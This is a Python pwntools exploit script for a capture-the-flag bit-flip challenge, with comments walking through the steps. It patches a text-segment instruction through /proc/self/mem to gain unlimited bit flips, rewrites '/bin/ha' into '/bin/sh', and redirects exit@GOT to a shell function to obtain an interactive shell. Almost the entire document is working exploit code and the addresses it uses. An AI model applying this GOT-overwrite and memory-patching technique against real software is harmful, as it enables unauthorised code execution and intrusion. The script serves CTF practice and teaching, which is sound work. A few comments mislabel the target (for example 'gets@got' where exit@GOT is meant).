#!/usr/bin/env python

from pwn import *

# https://dothidden.xyz/ctfs/glacierctf_2023/flipper/
# We can change 1 bit in the whole process virtual memory
# Writing to memory through /proc/self/mem bypasses all segment protections. So even if a segment is r-- you can still write to it.
# That means we can actually change the `text` segment through 1 bit.
# One bit may not seem enough, but maybe we can change the code so that we have unlimited bit flips

# Looking at the disassembly of the binary:
# 4013a2:       c6 05 f3 2c 00 00 01    mov    BYTE PTR [rip+0x2cf3],0x1        # 40409c <FLIPPED> (File Offset: 0x409c)
# This line is where the `FLIPPED` variable is changed to 1 in the `flip_bit` function
# So we can just flip one bit and make the `FLIPPED` variable set to 0

# So we know the instruction that sets `FLIPPED` is at the address 0x4013a2
# So the value that we need to change is at address 0x4013a2 + 6 (bytes) = 0x4013a8
# So we just flip the right-most bit to 0

target = process("./bin/ex2")

# target.recvuntil(b'--------------------------\n\n')

# Choose the flip-bit action
target.sendline(b"1")

FLIPPED_set_0_address = 0x4013a8

# Send target address
target.sendline(hex(FLIPPED_set_0_address).encode())
# Send target bit 0
target.sendline(b"0")

# Now we have infinite flips :)
# The idea now is to change the string in the `shell` function from "/bin/ha" into "/bin/sh"
# Then find some way to call the `shell` function

# pwndbg> search "/bin/ha"
# Searching for value: '/bin/ha'
# ex2             0x4020a9 0x61682f6e69622f /* '/bin/ha' */

# We need to change 'h' to 's' (0x68 -> 0x73)
# 0 1 1 0 1 0 0 0 -> 
# 0 1 1 1 0 0 1 1
# Flip bits: 0, 1, 3, 4

# We need to change 'a' to 'h' (0x61 -> 0x68)
# 0 1 1 0 0 0 0 1
# 0 1 1 0 1 0 0 0
# Flip bits: 0, 3

bin_ha_address = 0x4020a9
h_to_s = [b"0", b"1", b"3", b"4"]

for bit_num in h_to_s:
    # Choose the flip-bit action
    target.sendline(b"1")
    # Send target address + 5 because h is at offset 5 from the start of the address
    target.sendline(hex(bin_ha_address + 5).encode())
    # Send the bit number
    target.sendline(bit_num)

a_to_h = [b"0", b"3"]
for bit_num in a_to_h:
    # Choose the flip-bit action
    target.sendline(b"1")
    # Send target address + 6 because a is at offset 6 from the start of the address
    target.sendline(hex(bin_ha_address + 6).encode())
    # Send the bit number
    target.sendline(bit_num)

# pwndbg> info address shell
# Symbol "shell" is a function at address 0x4013b0
# Ideea is to flip the address of exit@got to `shell` function address

# objdump -R ./bin/ex2 | grep -i exit
# 0000000000404068 R_X86_64_JUMP_SLOT  exit@GLIBC_2.2.5

shell_address = 0x4013b0
exit_got_address = 0x404068

# exit_got_value = 0x4010d6 = 0 1 0 0 0 0 0 0 0 0 0 1 0 0 0 0 1 1 0 1 0 1 1 0
# 0 1 0 0 0 0 0 0 0 0 0 1 0 0 0 0 1 1 0 1 0 1 1 0 ->
# 0 1 0 0 0 0 0 0 0 0 0 1 0 0 1 1 1 0 1 1 0 0 0 0
# Flip bits: 1, 2, 5, 6, 8 ,9


# 3, 4, 6, 7
zero_seven_bits = [b"1", b"2", b"5", b"6"]
# 8, 9 % 8
eight_fifteen_bits = [b"0", b"1"]

for bit_num in zero_seven_bits:
    # Choose the flip-bit action
    target.sendline(b"1")
    # Send target address gets@got to modify first 8 bits (first byte)
    target.sendline(hex(exit_got_address).encode())
    # Send the bit number
    target.sendline(bit_num)

for bit_num in eight_fifteen_bits:
    # Choose the flip-bit action
    target.sendline(b"1")
    # Send target address gets@got + 1 (byte) to modify the second byte
    target.sendline(hex(exit_got_address + 1).encode())
    # Send the bit number
    target.sendline(bit_num)

# Send exit choice
target.sendline(b"2")

target.interactive()
